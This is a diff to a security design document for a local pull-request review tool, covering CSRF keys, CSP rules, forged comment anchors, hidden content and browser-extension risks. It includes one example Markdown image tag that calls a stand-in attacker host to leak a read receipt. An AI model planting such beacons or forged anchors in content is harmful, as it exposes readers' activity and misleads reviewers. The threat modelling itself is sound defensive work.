@@ -18,7 +18,18 @@ attacks, in `packages/server/src/middleware/security.ts`:
 |---|---|
 | `Host` header must be localhost | DNS rebinding, where an attacker domain resolves to 127.0.0.1 |
 | `Origin` must be a known origin | ordinary cross-origin reads |
-| `X-Pilcrow: 1` required on `/api/*` | CSRF — a `<form>` cannot set custom headers, and a cross-origin `fetch` that tries earns a preflight we fail |
+| `X-Pilcrow` must carry this launch's key | CSRF — a `<form>` cannot set custom headers, and a cross-origin `fetch` that tries earns a preflight we fail |
+
+The header value is a random per-launch key, not a constant. Be clear about the limit: a process
+running as **you** can read `~/.pilcrow/session` (mode 0600) and use the API. The key stops
+drive-by scripts and anything running as another user; it is not a defence against code you have
+already run as yourself.
+
+Responses carry `Content-Security-Policy` with `frame-ancestors 'none'` (so the UI, including its
+token field, cannot be embedded in another page) and an `img-src` that permits only GitHub-hosted
+images. That second one is not cosmetic: an `<img src="https://evil.test/b.png?doc=x">` in a
+Markdown file is a read receipt telling its author that a private document was opened, from your
+IP, at that moment, with no script involved.
 
 The server binds `127.0.0.1` only, never `0.0.0.0`.
 
@@ -48,6 +59,30 @@ phishing primitive against *other* people. That is why the one-click flow (autho
 PKCE, which binds a redirect URI) is preferred over device flow where a browser is available.
 
 Pilcrow never reuses another product's client id.
+
+## The pull request author is a threat, not just the network
+
+Pilcrow renders content written by the person being reviewed, and a review comment is a statement
+of record. Two attacks follow from that, and both are defended:
+
+- **Forged anchors.** `data-` attributes survive sanitisation, so a pull request could ship its
+  own `data-pilcrow-pos` and steer where your comment landed — you highlight one sentence, the
+  comment posted to GitHub quotes another. The position attribute is namespaced with a
+  per-render nonce the document cannot predict. `integrity.test.ts` covers both directions.
+- **Hidden or overlaid content.** The `style` and `class` attributes are stripped, so a file
+  cannot hide text from the rendered view you approve from, nor paint over the interface —
+  including the Approve button.
+
+## Browser extensions
+
+Any extension with content-script access to `localhost` can read what you type into the app and
+drive the API. This is a property of shipping a local web UI that holds a `repo` token, not a bug
+that can be patched in-page. The CSP does not constrain extensions.
+
+## Contributor note
+
+The anchoring spike caches fetched repository content under `.cache/corpus/`. It is gitignored,
+but it is real repository content sitting in your working tree.
 
 ## What is not protected
 
